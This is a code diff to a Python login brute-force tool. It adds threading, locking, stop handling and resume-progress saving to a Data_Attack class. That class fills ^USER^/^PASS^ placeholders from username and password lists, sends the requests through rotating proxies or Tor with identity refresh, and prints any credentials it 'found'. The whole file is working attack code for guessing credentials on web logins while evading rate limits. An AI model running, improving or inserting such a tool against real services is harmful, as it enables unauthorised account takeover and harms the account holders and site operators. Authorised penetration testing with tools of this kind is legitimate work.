@@ -3,6 +3,7 @@ from stem.control import Controller
 from lib.core.loggin import log
 from lib.core.managers.DataManager import SaveDataBase
 from http.client import responses
+from threading import Event, Lock
 import sys
 import random
 import subprocess
@@ -77,7 +78,7 @@ class Proxy:
 
     def test_connection(self, proxy: object):
         try:
-            get("https://www.torproject.org", proxies=proxy)
+            get("https://www.torproject.org", timeout=10, proxies=proxy)
             return True
         except Exception:
             return False
@@ -92,6 +93,7 @@ class Requester(Proxy):
         self.data = data
 
         self.session = Session()
+
 
     def send(self, data: str | int) -> object:
         req = Request(url=self.url, data=data, method=self.method, headers=self.headers)
@@ -134,7 +136,8 @@ class Data_Attack(Requester):
                  proxies: list = None, 
                  tor: tuple = (), 
                  proxy: str = None,
-                 resume: bool = True
+                 resume: bool = True,
+                 numer_of_threads: int = 1
                 ):
         self.url = url
         self.method = method
@@ -148,7 +151,10 @@ class Data_Attack(Requester):
         self.timeout = timeout
         self.save = SaveDataBase(url)
         self.resume = resume
-        self.last_save = {}
+        self.should_stop = Event()
+        self.lock = Lock()
+        self.last_tested = [0] * numer_of_threads
+        self.running = None
 
         self.s = None
         self.f = None
@@ -169,17 +175,32 @@ class Data_Attack(Requester):
             self.use_tor(protocol=tor[0], port=tor[1])
             self.tor = Tor(control_port=tor[2])
             self.tor.connect(tor[3])
+        
+    def stop(self) -> None:
+        self.should_stop.set()
+        self.save_progress()
+        if self.tor:
+            self.tor.close()
     
-    def save_progress(self, thread: int, param: str, current_list: list) -> None:
-        index = current_list.index(param)
-        self.save.update(thread, index)
+    def save_progress(self) -> None:
+        with self.lock:
+            data = self.save.read() or {}
+            for index, value in enumerate(self.last_tested):
+                if str(index) not in data:
+                    self.save.update(index, value)
+                elif int(data[str(index)]) < int(value):
+                    self.save.update(index, value)
     
     def get_save(self, thread):
         data = self.save.read()
         if data and self.resume:
-            return int(self.save.read()[thread])
+            data = int(data[str(thread)])
+            self.attempts+=data
+            return data
 
     def __send(self, data: str | int, id: int = 0, type: tuple = None) -> None:
+        if self.should_stop.is_set():
+            return True
         if self.proxies:
             self.session = Session()
             self.update_proxy(self._format(random.choice(self.proxies)))
@@ -191,8 +212,9 @@ class Data_Attack(Requester):
                     self.update_tor()
                 return self.__send(data=data, id=id, type=type)
             sf = check_response(my_response=self.s or self.f, response=res)
-            sys.stdout.write(f'\033[2K\r{self.attempts} of {self.total} => {(self.attempts * 100 / self.total):.2f}% [\033[38;2;255;0;111m#{id}\033[0m \033[35m{type[1]}\033[0m|\033[35m{type[2]}\033[0m => \033[38;5;214m{res.status_code}\033[0m]\r')
-            sys.stdout.flush()
+            with self.lock:
+                sys.stdout.write(f'\033[2K\r{self.attempts} of {self.total} => {(self.attempts * 100 / self.total):.2f}% [\033[38;2;255;0;111m#{id}\033[0m \033[35m{type[1]}\033[0m|\033[35m{type[2]}\033[0m => \033[38;5;214m{res.status_code}\033[0m]\r')
+                sys.stdout.flush()
             if (self.s and sf) or (self.f and not sf):
                 sys.stdout.write(f'\033[2K\n[\033[0;32m+\033[0m] {type[0].capitalize()} found: {type[1]} ({self.attempts}) [#{id} {res.status_code}]\n')
                 sys.stdout.flush()
@@ -203,40 +225,50 @@ class Data_Attack(Requester):
             self.__send(data=data, id=id, type=type)
 
     def bruteforce_username(self, usernames: list, password: str, id: int = 0) -> None:
-        list_ = usernames[id] if self.save.read() == None else usernames[id][self.get_save(id)]
-        for username in list_:
-            
+        _list = usernames[id] if self.save.read() == None else usernames[id][self.get_save(id):]
+        for index, username in enumerate(_list):
+            if not self.running:
+                break
             result = self.__send(data=self.data
                                  .replace("^USER^", username)
                                  .replace("^PASS^", password),
                                  id=id, 
-                                 type=('username', username, password)
+                                 type=('username', username, password),
                                 )
+            
+            self.last_tested[id] = index
             if result:
                 break
 
 
     def bruteforce_password(self, username: str, passwords: list, id: int = 0):
-        list_ = passwords[id] if self.save.read() == None else passwords[id][self.get_save(id)]
-        for password in list_:
-           
+        _list = passwords[id] if self.save.read() == None else passwords[id][self.get_save(id):]
+        for index, password in enumerate(_list):
+            if not self.running:
+                break
             result = self.__send(data=self.data
                                  .replace("^USER^", username)
                                  .replace("^PASS^", password),
                                  id=id, 
-                                 type=('password', username, password)
+                                 type=('password', username, password),
                                 )
+            
+            self.last_tested[id] = index
             if result:
                 break
     
     def bruteforce_password_and_username(self, usernames: list, passwords: list, id: int = 0):
         for username in usernames[id]:
+            if not self.running:
+                break
             for password in passwords[id]:
+                if not self.running:
+                    break
                 result = self.__send(data=self.data
                                  .replace("^USER^", username)
                                  .replace("^PASS^", password)
                                  ,id=id, 
-                                 type=('password and username', username, password)
+                                 type=('password and username', username, password),
                                 )
             if result:
                 break
